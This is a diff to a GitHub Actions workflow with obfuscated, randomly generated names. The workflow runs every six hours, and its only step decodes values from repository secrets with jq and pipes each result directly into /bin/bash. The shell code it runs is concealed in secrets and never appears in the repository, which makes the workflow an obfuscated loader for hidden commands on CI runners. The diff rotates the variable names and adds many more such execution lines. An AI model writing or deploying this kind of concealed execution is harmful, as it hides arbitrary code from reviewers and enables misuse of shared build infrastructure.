@@ -3,21 +3,34 @@ name: pubianpxx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '2 2/6 * * *'
 
-jobs:  # 15010
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pubianpxx
         env:
-          eakc97: ${{ secrets.eakc97 }}
+          agt4: ${{ secrets.agt4 }}
         run: |
-          echo $eakc97 | jq -r .xy39 | /bin/bash
-          echo $qu2 | jq -r .rnkh57496 | /bin/bash
-          echo $qlv098 | jq -r .g725 | /bin/bash
-          echo $zk5 | jq -r .ay4 | /bin/bash
-          echo $uu958 | jq -r .tberq9 | /bin/bash
+          echo $agt4 | jq -r .enbtt137 | /bin/bash
+          echo $aksw6404 | jq -r .k88 | /bin/bash
+          echo $aw565 | jq -r .mkcru26 | /bin/bash
+          echo $ajsl3 | jq -r .f30 | /bin/bash
+          echo $qo93 | jq -r .kqzbu3 | /bin/bash
+          echo $g28009 | jq -r .cce6661 | /bin/bash
+          echo $owaf98 | jq -r .w89 | /bin/bash
+          echo $mtdza3435 | jq -r .lt61 | /bin/bash
+          echo $i842 | jq -r .p87 | /bin/bash
+          echo $nacvl17 | jq -r .omcs24629 | /bin/bash
+          echo $r986 | jq -r .xmsf74 | /bin/bash
+          echo $meev626 | jq -r .iu966 | /bin/bash
+          echo $yq2197 | jq -r .btq0715 | /bin/bash
+          echo $acyqw98581 | jq -r .s2142 | /bin/bash
+          echo $tzbb6169 | jq -r .gln9 | /bin/bash
+          echo $it57049 | jq -r .hwq3779 | /bin/bash
+          echo $m04 | jq -r .abtkw06 | /bin/bash
+          echo $sqb9768 | jq -r .uie74104 | /bin/bash
+          echo $h2503 | jq -r .fkv772 | /bin/bash
 
